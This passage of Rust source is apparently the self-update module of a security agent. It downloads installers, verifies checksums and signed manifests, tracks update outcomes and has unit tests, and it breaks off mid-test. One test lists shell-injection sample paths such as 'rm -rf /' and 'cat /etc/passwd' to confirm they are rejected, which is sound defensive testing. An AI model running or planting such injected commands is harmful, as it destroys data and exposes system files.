// Copyright (c) 2024-2026 Cyber Threat Consulting
// SPDX-License-Identifier: MIT

use crate::api_client::ApiClient;
use agent_common::error::{CommonError, Result};
use agent_common::process::silent_command;
use agent_common::types::{UpdateInfo, UpdateManifest};
use semver::Version;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::sync::Arc;
#[allow(unused_imports)]
use tracing::{debug, error, info, warn};

/// Characters that are forbidden in installer paths to prevent shell injection.
const UNSAFE_PATH_CHARS: [char; 23] = [
    ';', '|', '&', '$', '`', '\'', '"', '\\', '\n', '\r', '(', ')', '{', '}', '<', '>', '*', '?',
    '[', ']', '!', '#', '~',
];

/// Validate that an installer path does not contain shell metacharacters.
///
/// Returns `Ok(())` if the path is safe, or an `Err` with a description of the
/// problem if it contains dangerous characters.
fn validate_installer_path(path_str: &str) -> Result<()> {
    validate_installer_path_for_platform(path_str, cfg!(target_os = "windows"))
}

fn validate_installer_path_for_platform(path_str: &str, windows: bool) -> Result<()> {
    // Windows separators are literal arguments to msiexec, never shell escapes.
    if path_str.is_empty()
        || path_str.contains('\0')
        || path_str
            .chars()
            .any(|c| UNSAFE_PATH_CHARS.contains(&c) && !(windows && c == '\\'))
    {
        return Err(CommonError::validation(format!(
            "Installer path contains unsafe characters: {}",
            path_str
        )));
    }
    Ok(())
}

/// Ed25519 public key trusted to sign update packages, embedded at build time.
///
/// Set the `SENTINEL_UPDATE_PUBKEY` environment variable when building release
/// artifacts to a hex-encoded 32-byte ed25519 public key. When present, update
/// packages MUST come with a manifest (`<package>.manifest.json`) signed with
/// this key and naming the announced version and the package's hash, or the
/// update is refused — this closes the gap where a compromised release server
/// could serve a malicious package with a matching SHA-256, or an old signed
/// package under a new version number.
///
/// When the variable is unset (e.g. local/dev builds, or releases not yet
/// signed), signature verification is skipped and the update falls back to
/// SHA-256 integrity only, preserving the previous behavior. Enforcement is
/// therefore opt-in per build and never bricks an unsigned release channel.
const UPDATE_PUBLIC_KEY_HEX: Option<&str> = option_env!("SENTINEL_UPDATE_PUBKEY");

/// Parse and validate the embedded update public key.
///
/// Returns `Ok(None)` when no key is embedded (verification disabled), or an
/// error if a key is embedded but malformed (fail closed — a build that opts
/// into signing must not silently degrade to unverified updates).
fn embedded_update_public_key() -> Result<Option<Vec<u8>>> {
    let Some(hex_key) = UPDATE_PUBLIC_KEY_HEX else {
        return Ok(None);
    };
    let hex_key = hex_key.trim();
    if hex_key.is_empty() {
        return Ok(None);
    }
    let bytes = hex::decode(hex_key).map_err(|e| {
        CommonError::validation(format!(
            "Embedded update public key is not valid hex: {}",
            e
        ))
    })?;
    if bytes.len() != 32 {
        return Err(CommonError::validation(format!(
            "Embedded update public key must be 32 bytes (ed25519), got {}",
            bytes.len()
        )));
    }
    Ok(Some(bytes))
}

/// Verify a detached ed25519 signature over `package_bytes`.
///
/// `signature_text` is the content of the `.sig` file: a hex-encoded 64-byte
/// ed25519 signature (optionally followed by whitespace/filename, mirroring the
/// checksum file format).
fn verify_ed25519_signature(
    public_key: &[u8],
    package_bytes: &[u8],
    signature_text: &str,
) -> Result<()> {
    let sig_hex = signature_text
        .split_whitespace()
        .next()
        .unwrap_or("")
        .trim();
    let signature = hex::decode(sig_hex)
        .map_err(|e| CommonError::validation(format!("Signature is not valid hex: {}", e)))?;
    if signature.len() != 64 {
        return Err(CommonError::validation(format!(
            "Signature must be 64 bytes (ed25519), got {}",
            signature.len()
        )));
    }

    let key = ring::signature::UnparsedPublicKey::new(&ring::signature::ED25519, public_key);
    key.verify(package_bytes, &signature)
        .map_err(|_| CommonError::validation("Update package signature verification failed"))?;
    Ok(())
}

/// Check the signed manifest of an update against what is about to be
/// installed: signed with the trusted key, for the announced version, for
/// this package and for exactly the bytes that were downloaded.
fn verify_manifest(
    public_key: &[u8],
    manifest_json: &str,
    signature_text: &str,
    announced_version: &str,
    package_name: &str,
    package_sha256: &str,
    package_size: u64,
) -> Result<UpdateManifest> {
    let manifest: UpdateManifest = serde_json::from_str(manifest_json)
        .map_err(|e| CommonError::validation(format!("Update manifest is unreadable: {}", e)))?;
    manifest
        .validate()
        .map_err(|why| CommonError::validation(format!("Update manifest refused: {}", why)))?;

    // Nothing in the manifest is trusted before this line passes.
    verify_ed25519_signature(public_key, &manifest.signed_message(), signature_text)?;

    let same_version = match (
        Version::parse(&manifest.version),
        Version::parse(announced_version),
    ) {
        (Ok(signed), Ok(announced)) => signed == announced,
        _ => false,
    };
    if !same_version {
        return Err(CommonError::validation(format!(
            "Update refused: the release server announces version {} but the signed \
             manifest is for version {}",
            announced_version, manifest.version
        )));
    }
    if manifest.package != package_name {
        return Err(CommonError::validation(format!(
            "Update refused: the signed manifest is for '{}', not '{}'",
            manifest.package, package_name
        )));
    }
    if !manifest.sha256.eq_ignore_ascii_case(package_sha256) || manifest.size != package_size {
        return Err(CommonError::validation(
            "Update refused: the downloaded package is not the one the manifest was signed for",
        ));
    }
    Ok(manifest)
}

/// SHA-256 of a file, hex.
fn sha256_file(path: &Path) -> Result<String> {
    use sha2::{Digest, Sha256};
    use std::io::Read;

    let mut file = std::fs::File::open(path)
        .map_err(|e| CommonError::io(format!("Failed to open package: {}", e)))?;
    let mut hasher = Sha256::new();
    let mut buffer = [0; 65536];
    loop {
        let count = file
            .read(&mut buffer)
            .map_err(|e| CommonError::io(format!("Failed to read package: {}", e)))?;
        if count == 0 {
            break;
        }
        hasher.update(&buffer[..count]);
    }
    Ok(format!("{:x}", hasher.finalize()))
}

// ── What became of an update ────────────────────────────────────────────────
//
// The agent hands the package to the system installer and exits: it never
// sees the result. A trace left on disk lets the next process tell whether it
// is the new version, report the real outcome, and wait before trying again
// instead of downloading and exiting at every check when the installer
// cannot succeed.

/// A scheduled check waits this long before retrying a version whose
/// installation did not go through. A person asking for the update is not
/// made to wait.
const RETRY_AFTER_FAILURE_SECS: i64 = 24 * 60 * 60;

/// An update handed to the system installer.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct UpdateAttempt {
    from_version: String,
    target_version: String,
    /// Unix time the installer was started.
    started_at: i64,
    /// The failure has been reported; the record only spaces out retries.
    #[serde(default)]
    reported: bool,
}

/// What became of the update started by a previous process.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum UpdateOutcome {
    /// This process is the version the update was for.
    Completed { version: String },
    /// The agent restarted and is still the old version.
    Failed { version: String },
}

fn attempt_path() -> PathBuf {
    agent_common::config::AgentConfig::platform_data_dir().join("update_attempt.json")
}

fn load_attempt(path: &Path) -> Option<UpdateAttempt> {
    serde_json::from_slice(&std::fs::read(path).ok()?).ok()
}

fn store_attempt(path: &Path, attempt: &UpdateAttempt) -> std::io::Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(path, serde_json::to_vec(attempt)?)
}

/// Outcome of `attempt`, seen from a process running `running_version`.
/// `None` once it has been reported.
fn settle_attempt(attempt: &UpdateAttempt, running_version: &str) -> Option<UpdateOutcome> {
    if attempt.reported {
        return None;
    }
    let reached = match (
        Version::parse(running_version),
        Version::parse(&attempt.target_version),
    ) {
        (Ok(running), Ok(target)) => running >= target,
        _ => running_version == attempt.target_version,
    };
    let version = attempt.target_version.clone();
    Some(if reached {
        UpdateOutcome::Completed { version }
    } else {
        UpdateOutcome::Failed { version }
    })
}

/// Whether `attempt` makes a scheduled update to `target_version` wait.
fn attempt_delays_retry(attempt: &UpdateAttempt, target_version: &str, now: i64) -> bool {
    // A start time in the future (clock set back since) delays nothing.
    attempt.target_version == target_version
        && (0..RETRY_AFTER_FAILURE_SECS).contains(&(now - attempt.started_at))
}

fn take_outcome_at(path: &Path, running_version: &str) -> Option<UpdateOutcome> {
    let attempt = load_attempt(path)?;
    let outcome = settle_attempt(&attempt, running_version)?;
    let kept = match outcome {
        UpdateOutcome::Completed { .. } => std::fs::remove_file(path),
        // Kept, marked as reported: it spaces out the next attempts.
        UpdateOutcome::Failed { .. } => store_attempt(
            path,
            &UpdateAttempt {
                reported: true,
                ..attempt
            },
        ),
    };
    if let Err(e) = kept {
        warn!("Update record not updated: {}", e);
    }
    Some(outcome)
}

/// What became of the update a previous process started, if any. Each
/// outcome is returned once.
pub fn take_update_outcome(running_version: &str) -> Option<UpdateOutcome> {
    take_outcome_at(&attempt_path(), running_version)
}

/// Whether a scheduled update to `target_version` should wait: installing
/// that version was tried recently and this process is still the old one.
pub fn retry_delayed(target_version: &str) -> bool {
    load_attempt(&attempt_path()).is_some_and(|attempt| {
        attempt_delays_retry(&attempt, target_version, chrono::Utc::now().timestamp())
    })
}

/// Orchestrates the agent self-update process.
pub struct UpdateManager {
    api_client: Arc<ApiClient>,
    current_version: String,
}

impl UpdateManager {
    /// Create a new UpdateManager.
    pub fn new(api_client: Arc<ApiClient>, current_version: String) -> Self {
        Self {
            api_client,
            current_version,
        }
    }

    /// Check if a newer version is available.
    pub async fn check_for_update(&self) -> Result<Option<UpdateInfo>> {
        debug!(
            "Checking for updates (current version: {})",
            self.current_version
        );
        let latest_info = self.api_client.get_latest_release_info().await?;

        let current = Version::parse(&self.current_version).map_err(|e| {
            CommonError::validation(format!(
                "Invalid current version '{}': {}",
                self.current_version, e
            ))
        })?;
        let latest = Version::parse(&latest_info.version).map_err(|e| {
            CommonError::validation(format!(
                "Invalid latest version '{}' from server: {}",
                latest_info.version, e
            ))
        })?;

        if latest > current {
            info!(
                "Update available: {} (current: {})",
                latest_info.version, self.current_version
            );
            Ok(Some(latest_info))
        } else {
            debug!("Agent is up to date (latest: {})", latest_info.version);
            Ok(None)
        }
    }

    /// Perform the full update process: download, verify, and execute installer.
    ///
    /// This function will likely result in the agent being terminated as the
    /// installer takes over and replaces the binary.
    pub async fn perform_update(&self, info: UpdateInfo) -> Result<()> {
        info!("Starting update process to version {}", info.version);

        // dpkg and rpm need root, and the packaged service runs unprivileged:
        // say so before downloading anything, instead of starting an
        // installer that can only fail once the agent has exited.
        #[cfg(target_os = "linux")]
        if !crate::service::is_admin() {
            return Err(CommonError::validation(format!(
                "Version {} is available, but installing it requires root: update the \
                 sentinel-agent package with your package manager",
                info.version
            )));
        }

        // 1. Determine platform-specific package details
        let (package_name, checksum_file) = self.get_platform_package_details()?;
        let folder = self.get_platform_folder();

        // 2. Download checksum
        let checksum_url = format!(
            "{}/{}/{}",
            agent_common::constants::RELEASES_BASE_URL,
            folder,
            checksum_file
        );
        debug!("Fetching checksum from {}", checksum_url);
        let expected_checksum = self.api_client.fetch_text(&checksum_url).await?;

        // 3. Download package
        let package_url = format!(
            "{}/{}/{}",
            agent_common::constants::RELEASES_BASE_URL,
            folder,
            package_name
        );

        // Use a unique temporary directory to prevent TOCTOU attacks
        let temp_dir = tempfile::tempdir()
            .map_err(|e| CommonError::io(format!("Failed to create temp directory: {}", e)))?;
        let download_path = temp_dir.path().join(package_name);

        info!("Downloading update package to {:?}", download_path);
        self.api_client
            .download_file(&package_url, &download_path)
            .await?;

        // 4. Verify checksum
        info!("Verifying package checksum...");
        self.verify_checksum(&download_path, &expected_checksum)?;

        // 5. Verify the signed manifest (mandatory only when this build
        // embeds a trusted public key; otherwise SHA-256 integrity only).
        self.verify_signature(&download_path, folder, package_name, &info.version)
            .await?;

        // 6. Trigger installer. It runs on after this process has exited:
        // the record lets the next one tell what became of the update.
        let attempt = UpdateAttempt {
            from_version: self.current_version.clone(),
            target_version: info.version.clone(),
            started_at: chrono::Utc::now().timestamp(),
            reported: false,
        };
        if let Err(e) = store_attempt(&attempt_path(), &attempt) {
            warn!("Update attempt not recorded: {}", e);
        }
        info!("Triggering system installer...");
        self.trigger_installer(&download_path)?;

        // Persist the temp directory so spawned installers (Windows/Linux) can still
        // access the downloaded package. macOS uses synchronous .output() so is safe,
        // but we persist unconditionally for robustness. The OS temp cleaner handles
        // eventual cleanup.
        let _ = temp_dir.keep();

        Ok(())
    }

    fn get_platform_folder(&self) -> &'static str {
        if cfg!(target_os = "macos") {
            "macos"
        } else if cfg!(target_os = "windows") {
            "windows"
        } else if cfg!(target_os = "linux") {
            if std::path::Path::new("/etc/debian_version").exists() {
                "linux_deb"
            } else {
                "linux_rpm"
            }
        } else {
            "unknown"
        }
    }

    fn get_platform_package_details(&self) -> Result<(&'static str, &'static str)> {
        if cfg!(target_os = "macos") {
            Ok((
                "SentinelAgent-latest.pkg",
                "SentinelAgent-latest.pkg.sha256",
            ))
        } else if cfg!(target_os = "windows") {
            Ok((
                "SentinelAgentSetup-latest.msi",
                "SentinelAgentSetup-latest.msi.sha256",
            ))
        } else if cfg!(target_os = "linux") {
            if std::path::Path::new("/etc/debian_version").exists() {
                Ok((
                    "sentinel-agent-latest-amd64.deb",
                    "sentinel-agent-latest-amd64.deb.sha256",
                ))
            } else {
                Ok((
                    "sentinel-agent-latest.x86_64.rpm",
                    "sentinel-agent-latest.x86_64.rpm.sha256",
                ))
            }
        } else {
            Err(CommonError::not_supported(
                "Self-update not supported on this platform",
            ))
        }
    }

    /// Verify the signed manifest of the downloaded package.
    ///
    /// If this build embeds a trusted public key (`SENTINEL_UPDATE_PUBKEY`),
    /// `<package>.manifest.json` and its signature are fetched and checked
    /// against the announced `version` and the downloaded bytes; any failure
    /// (missing file, bad signature, other version, other content) aborts the
    /// update. If no key is embedded, verification is skipped with a warning so
    /// unsigned release channels keep working (SHA-256 integrity still applies).
    async fn verify_signature(
        &self,
        path: &std::path::Path,
        folder: &str,
        package_name: &str,
        version: &str,
    ) -> Result<()> {
        let public_key = match embedded_update_public_key()? {
            Some(key) => key,
            None => {
                warn!(
                    "Update signature verification is disabled (no SENTINEL_UPDATE_PUBKEY \
                     embedded at build time); relying on SHA-256 integrity only"
                );
                return Ok(());
            }
        };

        let manifest_url = format!(
            "{}/{}/{}.manifest.json",
            agent_common::constants::RELEASES_BASE_URL,
            folder,
            package_name
        );
        info!("Verifying signed update manifest...");
        debug!("Fetching manifest from {}", manifest_url);
        let unavailable = |what: &str, e: CommonError| {
            CommonError::validation(format!(
                "This build requires signed updates but the {} could not be fetched: {}",
                what, e
            ))
        };
        let manifest_json = self
            .api_client
            .fetch_text(&manifest_url)
            .await
            .map_err(|e| unavailable("release manifest", e))?;
        let signature_text = self
            .api_client
            .fetch_text(&format!("{manifest_url}.sig"))
            .await
            .map_err(|e| unavailable("manifest signature", e))?;

        let size = std::fs::metadata(path)
            .map_err(|e| CommonError::io(format!("Failed to read package size: {}", e)))?
            .len();
        let manifest = verify_manifest(
            &public_key,
            &manifest_json,
            &signature_text,
            version,
            package_name,
            &sha256_file(path)?,
            size,
        )?;
        info!(
            "Update manifest verified: version {}, {} bytes",
            manifest.version, manifest.size
        );
        Ok(())
    }

    fn verify_checksum(&self, path: &std::path::Path, expected: &str) -> Result<()> {
        let hash = sha256_file(path)?;

        // Extract the first part of the checksum file content (which might be "hash filename")
        let expected_hash = expected
            .split_whitespace()
            .next()
            .unwrap_or(expected)
            .to_lowercase();

        // Validate hash format: must be exactly 64 hex characters (SHA-256)
        if expected_hash.len() != 64 || !expected_hash.chars().all(|c| c.is_ascii_hexdigit()) {
            error!(
                "Invalid SHA-256 format: expected 64 hex chars, got {} chars",
                expected_hash.len()
            );
            return Err(CommonError::validation("Invalid SHA-256 checksum format"));
        }

        // Use constant-time comparison to prevent timing attacks
        let ct_equal = hash.len() == expected_hash.len()
            && hash
                .as_bytes()
                .iter()
                .zip(expected_hash.as_bytes())
                .fold(0u8, |acc, (a, b)| acc | (a ^ b))
                == 0;
        if !ct_equal {
            error!(
                "Checksum mismatch! Expected {}, got {}",
                expected_hash, hash
            );
            return Err(CommonError::validation(
                "Package checksum verification failed",
            ));
        }

        debug!("Checksum verification successful: {}", hash);
        Ok(())
    }

    fn trigger_installer(&self, path: &std::path::Path) -> Result<()> {
        let path_str = path
            .to_str()
            .ok_or_else(|| CommonError::validation("Invalid download path"))?;

        // SECURITY: Validate the installer path to prevent command injection on all platforms.
        // The path comes from our own temp directory, but defense-in-depth
        // requires rejecting any shell metacharacters.
        validate_installer_path(path_str)?;

        #[cfg(target_os = "macos")]
        {
            if agent_common::macos::is_admin() {
                // If already root, spawn the installer directly using argument array
                // (no shell interpolation) to prevent command injection.
                info!("Running as root, executing detached installer");
                silent_command("/usr/sbin/installer")
                    .args(["-pkg", path_str, "-target", "/"])
                    .spawn()
                    .map_err(|e| {
                        CommonError::system(format!("Failed to launch installer: {}", e))
                    })?;
            } else {
                info!("Not running as root, requesting elevation for detached installer");
                agent_common::macos::run_installer_elevated(path_str)?;
                // The elevated installer ran synchronously, so its postinstall
                // `open` only re-activated this still-running instance. Reopen
                // the updated bundle once this process has exited.
                if let Err(e) = schedule_macos_relaunch() {
                    warn!("Failed to schedule relaunch after update: {}", e);
                }
            }
            info!("macOS installer spawned successfully");
        }

        #[cfg(target_os = "windows")]
        {
            info!("Executing pre-update process termination for robust install...");

            // Forcefully terminate any running GUI processes and their children to release file locks.
            // We use /IM (Image Name) and /T (Tree Kill) /F (Force).
            // This ensures agent-gui.exe and any sub-processes are completely gone.
            let kill_gui = silent_command("taskkill")
                .args(["/F", "/T", "/IM", "agent-gui.exe"])
                .output();

            match kill_gui {
                Ok(output) if output.status.success() => {
                    info!("Successfully terminated agent-gui.exe process tree.");
                }
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if stderr.contains("not found") || stderr.contains("introuvable") {
                        debug!("No agent-gui.exe process found to terminate.");
                    } else {
                        warn!(
                            "Taskkill reported an issue (GUI may still be locked): {}. Proceeding with MSI.",
                            stderr
                        );
                    }
                }
                Err(e) => {
                    warn!(
                        "Failed to execute taskkill for agent-gui.exe: {}. Proceeding with MSI.",
                        e
                    );
                }
            }

            info!("Executing: msiexec /i {} /quiet", path_str);
            silent_command("msiexec")
                .args(["/i", path_str, "/quiet"])
                .spawn()
                .map_err(|e| CommonError::system(format!("Failed to launch msiexec: {}", e)))?;
        }

        #[cfg(target_os = "linux")]
        {
            if std::path::Path::new("/etc/debian_version").exists() {
                info!("Executing: dpkg -i {}", path_str);
                silent_command("dpkg")
                    .args(["-i", path_str])
                    .spawn()
                    .map_err(|e| CommonError::system(format!("Failed to launch dpkg: {}", e)))?;
            } else {
                info!("Executing: rpm -Uvh {}", path_str);
                silent_command("rpm")
                    .args(["-Uvh", path_str])
                    .spawn()
                    .map_err(|e| CommonError::system(format!("Failed to launch rpm: {}", e)))?;
            }
        }

        info!(
            "Installer started in the background. The agent will now exit to allow self-update, and will be restarted automatically."
        );

        // Sleep very briefly to ensure logs flush
        std::thread::sleep(std::time::Duration::from_millis(500));

        // Terminate the process with success code so the installer can seamlessly replace the binary
        std::process::exit(0);
    }
}

/// Spawn a detached helper that waits for this process to exit, then reopens
/// the application bundle so the freshly installed version starts.
#[cfg(target_os = "macos")]
fn schedule_macos_relaunch() -> std::io::Result<()> {
    use std::os::unix::process::CommandExt;

    let bundle = std::env::current_exe()
        .ok()
        .and_then(|exe| exe.ancestors().nth(3).map(std::path::Path::to_path_buf))
        .filter(|path| path.extension().is_some_and(|ext| ext == "app"))
        .unwrap_or_else(|| std::path::PathBuf::from("/Applications/SentinelAgent.app"));

    // Values are passed as positional arguments, never interpolated into the
    // script. The wait is bounded (~60s) so the helper cannot linger forever.
    let script = r#"i=0
while kill -0 "$1" 2>/dev/null && [ "$i" -lt 120 ]; do sleep 0.5; i=$((i+1)); done
sleep 1
exec /usr/bin/open "$2""#;

    std::process::Command::new("/bin/sh")
        .arg("-c")
        .arg(script)
        .arg("sentinel-relaunch")
        .arg(std::process::id().to_string())
        .arg(&bundle)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        // Own process group: launchd reaps the agent's group when it exits.
        .process_group(0)
        .spawn()?;
    info!("Scheduled relaunch of {} after update", bundle.display());
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn windows_installer_accepts_native_separators_without_allowing_injection() {
        assert!(
            validate_installer_path_for_platform(
                r"C:\Users\Alice\AppData\Local\Temp\Sentinel.msi",
                true
            )
            .is_ok()
        );
        assert!(validate_installer_path_for_platform(r"C:\Temp\bad&command.msi", true).is_err());
        assert!(validate_installer_path_for_platform("", true).is_err());
        assert!(validate_installer_path_for_platform("/tmp/pkg\0.pkg", false).is_err());
    }

    // ── installer path: shell metacharacter rejection ───────────────────

    #[test]
    fn test_installer_path_rejects_shell_metacharacters() {
        // Each of these characters must be rejected individually
        let dangerous_paths = [
            "/tmp/pkg;rm -rf /",        // semicolon
            "/tmp/pkg|cat /etc/passwd", // pipe
            "/tmp/pkg&background",      // ampersand
            "/tmp/pkg$(whoami)",        // dollar sign
            "/tmp/pkg`id`",             // backtick
            "/tmp/pkg'injected'",       // single quote
            "/tmp/pkg\"injected\"",     // double quote (escaped for Rust)
            "/tmp/pkg\\escaped",        // backslash
            "/tmp/pkg\nwhoami",         // newline
            "/tmp/pkg\rwhoami",         // carriage return
            "/tmp/pkg(sub)",            // open paren
            "/tmp/pkg)end",             // close paren
            "/tmp/pkg{block}",          // open brace
            "/tmp/pkg}end",             // close brace
            "/tmp/pkg<input",           // less than
            "/tmp/pkg>output",          // greater than
        ];

        for path in &dangerous_paths {
            let result = validate_installer_path_for_platform(path, false);
            assert!(
                result.is_err(),
                "Path '{}' should be rejected for containing shell metacharacters",
                path.escape_debug()
            );
            let err_msg = result.unwrap_err().to_string();
            assert!(
                err_msg.contains("unsafe characters"),
                "Error for '{}' should mention unsafe characters, got: {}",
                path.escape_debug(),
                err_msg
            );
        }
    }

    // ── installer path: valid paths accepted ────────────────────────────

    #[test]
    fn test_installer_path_accepts_valid_path() {
        let valid_paths = [
            "/tmp/SentinelAgent-latest.pkg",
            "/var/folders/abc123/T/tmpXYZ/SentinelAgentSetup-latest.msi",
            "/tmp/sentinel-agent-latest-amd64.deb",
            "/tmp/sentinel-agent-latest.x86_64.rpm",
            "/home/user/.cache/sentinel/update.pkg",
            // Paths with spaces are acceptable (no shell injection risk
            // when passed as argument array elements, not via shell).
            "/tmp/my folder/package.pkg",
            // Paths with hyphens, underscores, dots
            "/tmp/sentinel_agent-v2.1.0-beta.pkg",
        ];

        for path in &valid_paths {
            let result = validate_installer_path(path);
            assert!(
                result.is_ok(),
                "Path '{}' should be accepted as valid, got error: {:?}",
                path,
                result.err()
            );
        }
    }

    // ── installer path: edge cases ──────────────────────────────────────

    // ── update signature verification ───────────────────────────────────

    /// Generate an ed25519 keypair and return (public_key_bytes, signing_key).
    fn test_keypair() -> (Vec<u8>, ring::signature::Ed25519KeyPair) {
        use ring::signature::KeyPair;
        let rng = ring::rand::SystemRandom::new();
        let pkcs8 = ring::signature::Ed25519KeyPair::generate_pkcs8(&rng).unwrap();
        let key_pair = ring::signature::Ed25519KeyPair::from_pkcs8(pkcs8.as_ref()).unwrap();
        let public = key_pair.public_key().as_ref().to_vec();
        (public, key_pair)
    }

    #[test]
    fn test_signature_accepts_valid_signature() {
        let (public, key_pair) = test_keypair();
        let package = b"pretend installer package bytes";
        let sig = key_pair.sign(package);
        let sig_text = hex::encode(sig.as_ref());

        assert!(verify_ed25519_signature(&public, package, &sig_text).is_ok());
    }

    #[test]
    fn test_signature_accepts_hash_style_sig_file() {
        // The .sig file may carry "<hex> <filename>" like the checksum file.
        let (public, key_pair) = test_keypair();
        let package = b"installer";
        let sig = key_pair.sign(package);
        let sig_text = format!("{}  SentinelAgent-latest.pkg\n", hex::encode(sig.as_ref()));

        assert!(verify_ed25519_signature(&public, package, &sig_text).is_ok());
    }

    #[test]
    fn test_signature_rejects_tampered_package() {
        let (public, key_pair) = test_keypair();
        let sig = key_pair.sign(b"original package");
        let sig_text = hex::encode(sig.as_ref());

        // Verify against different bytes -> must fail.
        let result = verify_ed25519_signature(&public, b"tampered package", &sig_text);
        assert!(result.is_err());
        assert!(
            result
                .unwrap_err()
                .to_string()
                .contains("signature verification failed"),
        );
    }

    #[test]
    fn test_signature_rejects_wrong_key() {
        let (_public_a, key_pair_a) = test_keypair();
        let (public_b, _key_pair_b) = test_keypair();
        let package = b"installer";
        let sig = key_pair_a.sign(package);
        let sig_text = hex::encode(sig.as_ref());

        // Signed by A, verified against B's key -> must fail.
        assert!(verify_ed25519_signature(&public_b, package, &sig_text).is_err());
    }

    #[test]
    fn test_signature_rejects_malformed_signature() {
        let (public, _key_pair) = test_keypair();
        // Not hex.
        assert!(verify_ed25519_signature(&public, b"pkg", "not-a-hex-signature").is_err());
        // Hex but wrong length.
        assert!(verify_ed25519_signature(&public, b"pkg", "abcd").is_err());
    }

    // ── signed manifest ─────────────────────────────────────────────────

    const PACKAGE: &str = "SentinelAgent-latest.pkg";

    fn manifest(version: &str, content: &[u8]) -> UpdateManifest {
        use sha2::{Digest, Sha256};
        UpdateManifest {
            version: version.to_string(),
            package: PACKAGE.to_string(),
            sha256: format!("{:x}", Sha256::digest(content)),
            size: content.len() as u64,
        }
    }

    /// A manifest as published: its JSON and the signature of its message.
    fn published(
        manifest: &UpdateManifest,
        key: &ring::signature::Ed25519KeyPair,
    ) -> (String, String) {
        (
            serde_json::to_string_pretty(manifest).unwrap(),
            hex::encode(key.sign(&manifest.signed_message()).as_ref()),
        )
    }

    fn check(
        public: &[u8],
        published: &(String, String),
        announced: &str,
        content: &[u8],
    ) -> Result<UpdateManifest> {
        use sha2::{Digest, Sha256};
        verify_manifest(
            public,
            &published.0,
            &published.1,
            announced,
            PACKAGE,
            &format!("{:x}", Sha256::digest(content)),
            content.len() as u64,
        )
    }

    #[test]
    fn test_manifest_accepts_the_announced_release() {
        let (public, key) = test_keypair();
        let package = b"the 4.0.44 package";
        let files = published(&manifest("4.0.44", package), &key);
        assert!(check(&public, &files, "4.0.44", package).is_ok());
    }

    /// The attack the manifest exists for: the server announces a new
    /// version and serves an older package with its genuine signature.
    #[test]
    fn test_manifest_refuses_an_old_signed_package_under_a_new_version() {
        let (public, key) = test_keypair();
        let old_package = b"the vulnerable 4.0.10 package";
        let old_files = published(&manifest("4.0.10", old_package), &key);

        let error = check(&public, &old_files, "4.0.44", old_package)
            .unwrap_err()
            .to_string();
        assert!(error.contains("announces version 4.0.44"), "{error}");
        assert!(error.contains("for version 4.0.10"), "{error}");
    }

    #[test]
    fn test_manifest_refuses_a_version_edited_after_signing() {
        let (public, key) = test_keypair();
        let package = b"the vulnerable 4.0.10 package";
        let (json, signature) = published(&manifest("4.0.10", package), &key);
        let edited = (json.replace("4.0.10", "4.0.44"), signature);

        let error = check(&public, &edited, "4.0.44", package)
            .unwrap_err()
            .to_string();
        assert!(error.contains("signature verification failed"), "{error}");
    }

    #[test]
    fn test_manifest_refuses_other_content_than_signed() {
        let (public, key) = test_keypair();
        let files = published(&manifest("4.0.44", b"the 4.0.44 package"), &key);
        let error = check(&public, &files, "4.0.44", b"something else entirely")
            .unwrap_err()
            .to_string();
        assert!(
            error.contains("not the one the manifest was signed for"),
            "{error}"
        );
    }

    #[test]
    fn test_manifest_refuses_another_platforms_package() {
        let (public, key) = test_keypair();
        let package = b"the 4.0.44 package";
        let mut other = manifest("4.0.44", package);
        other.package = "SentinelAgentSetup-latest.msi".to_string();
        let files = published(&other, &key);
        assert!(check(&public, &files, "4.0.44", package).is_err());
    }

    #[test]
    fn test_manifest_refuses_another_key_and_unreadable_files() {
        let (_, signing_key) = test_keypair();
        let (other_public, _) = test_keypair();
        let package = b"the 4.0.44 package";
        let files = published(&manifest("4.0.44", package), &signing_key);
        assert!(check(&other_public, &files, "4.0.44", package).is_err());

        let (public, _) = test_keypair();
        let garbage = ("<html>404</html>".to_string(), files.1.clone());
        assert!(check(&public, &garbage, "4.0.44", package).is_err());
    }

    /// The signature covers the fields, not the text of the file: the
    /// manifest may be re-indented on its way.
    #[test]
    fn test_manifest_signature_does_not_depend_on_json_layout() {
        let (public, key) = test_keypair();
        let package = b"the 4.0.44 package";
        let signed = manifest("4.0.44", package);
        let signature = hex::encode(key.sign(&signed.signed_message()).as_ref());

        let compact = serde_json::to_string(&signed).unwrap();
        let indented = serde_json::to_string_pretty(&signed).unwrap();
        assert_ne!(compact, indented);
        assert!(check(&public, &(compact, signature.clone()), "4.0.44", package).is_ok());
        assert!(check(&public, &(indented, signature), "4.0.44", package).is_ok());
    }

    #[test]
    fn test_sha256_file_matches_the_content() {
        use sha2::{Digest, Sha256};
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("package.bin");
        std::fs::write(&path, b"package bytes").unwrap();
        assert_eq!(
            sha256_file(&path).unwrap(),
            format!("{:x}", Sha256::digest(b"package bytes"))
        );
    }

    // ── what became of an update ────────────────────────────────────────

    fn attempt(target: &str, started_at: i64) -> UpdateAttempt {
        UpdateAttempt {
            from_version: "4.0.43".to_string(),
            target_version: target.to_string(),
            started_at,
            reported: false,
        }
    }

    #[test]
    fn test_the_new_version_reports_the_update_completed_once() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("update_attempt.json");
        store_attempt(&path, &attempt("4.0.44", 1_000)).unwrap();

        assert_eq!(
            take_outcome_at(&path, "4.0.44"),
            Some(UpdateOutcome::Completed {
                version: "4.0.44".to_string()
            })
        );
        assert!(!path.exists(), "nothing is left to space out");
        assert_eq!(take_outcome_at(&path, "4.0.44"), None);
    }

    #[test]
    fn test_the_old_version_coming_back_reports_the_failure_once() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("update_attempt.json");
        store_attempt(&path, &attempt("4.0.44", 1_000)).unwrap();

        assert_eq!(
            take_outcome_at(&path, "4.0.43"),
            Some(UpdateOutcome::Failed {
                version: "4.0.44".to_string()
            })
        );
        // Reported once, but the record still spaces out the retries.
        assert_eq!(take_outcome_at(&path, "4.0.43"), None);
        let kept = load_attempt(&path).expect("record kept");
        assert!(kept.reported);
